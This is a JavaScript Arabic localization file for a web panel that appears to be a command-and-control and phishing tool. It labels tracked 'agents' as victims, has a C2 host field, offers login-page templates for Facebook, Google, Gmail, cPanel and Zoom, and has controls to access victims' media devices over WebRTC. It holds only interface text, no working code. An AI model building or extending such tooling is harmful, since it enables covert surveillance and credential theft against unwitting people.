export const ar = {
  changeMode: 'تبديل بين وضع الليل و النهار',
  changeLanguage: 'تغيير اللغة إلى الإتجليزية',
  showSidebar: 'عرض قائمة الصفحات',
  titles: {
    login: 'تسجيل الدخول',
    dashboard: 'لوحة التحكم',
    users: 'المستخدمين',
    agents: 'الضحايا',
    agent: 'الضحية',
    test_agent: 'تجربة الضحية',
    back: 'رجوع',
    cancel: 'إلغاء',
    close: 'إغلاق',
    send_result: 'إرسال النتيجة',
    acknowledge_command: 'إرسال أمر الإستلام',
    status: 'الحالة',
    connected: 'متصل',
    disconnected: 'غير متصل',
    charts: {
      agents_per_month: 'عدد الضحايا في الشهر',
      agents_by_country: 'عدد الضحايا حسب الدولة',
      agents_by_site: 'عدد الضحايا حسب الموقع',
    },
    init_webrtc_device: 'تشغيل جهاز الوسائط',
    close_webrtc_device: 'إغلاق جهاز الوسائط',
    command_webrtc_session: 'إرسال أمر الجلسة',
    join_webrtc_session: 'إنضمام إلى الجلسة',
    leave_webrtc_session: 'مغادرة الجلسة',
    request_peer_devices: 'طلب أجهزة الضحية',
    peer_devices: 'أجهزة الضحية',
    no_peer_devices: 'لم يتم إكتشاف أجهزة لدى الضحية',
    select_peer_device: 'أختر جهاز الضحية',
    agent_status: 'حالة الضحية',
    peer_webrtc_status: 'حالة الضحية في الجلسة',
    pick_template: 'إختر قالب',
    templates: {
      facebook: 'فيسبوك',
      google: 'جوجل',
      youtube: 'يوتيوب',
      gmail: 'جيميل',
      messenger: 'مسنجر',
      cpanel: 'لوحة التحكم - CPanel',
      meet: 'ميت - Google meet',
      zoom: 'زوم',
    }
  },
  descriptions: {
    login: '',
    dashboard: 'عرض الإحصائيات',
    users: 'قائمة المستخدمين',
    agents: 'قائمة الضحايا',
    test_agent: 'إجراء تجارب الإتصال',
  },
  inputs: {
    username: 'إسم المستخدم',
    password: 'كلمة المرور',
    role: 'دور المستخدم',
    c2host: 'مركز إتصال الضحايا',
    result: 'النتيجة',
  },
  actions: {
    login: {
      errors: {
        title: 'فشل تسجيل الدخول',
        invalid: 'إسم المستخدم أو كلمة المرور غير صحيحة',
        timeout: 'تأخر الرد من الخادم',
      },
      success: {
        loggedIn: 'تم تسجيل الدخول بنجاح',
      },
      login: 'تسجيل الدخول',
    },
    logout: {
      errors: {
        title: 'فشل تسجيل الخروج',
        invalid: 'فشل تسجيل الخروج, تأكد من أنك مسجل الدخول أو أعد تحميل الصفحة',
        timeout: 'تأخر الرد من الخادم',
      },
      success: {
        loggedOut: 'تم تسجيل الخروج بنجاح',
      },
      logout: 'تسجيل الخروج',
    },
    agents: {},
  },
  messages: {
    agents: {
      errors: {
        no_such_agent: 'لا توجد ضحية بهذا المعرف',
      }
    }
  }
};
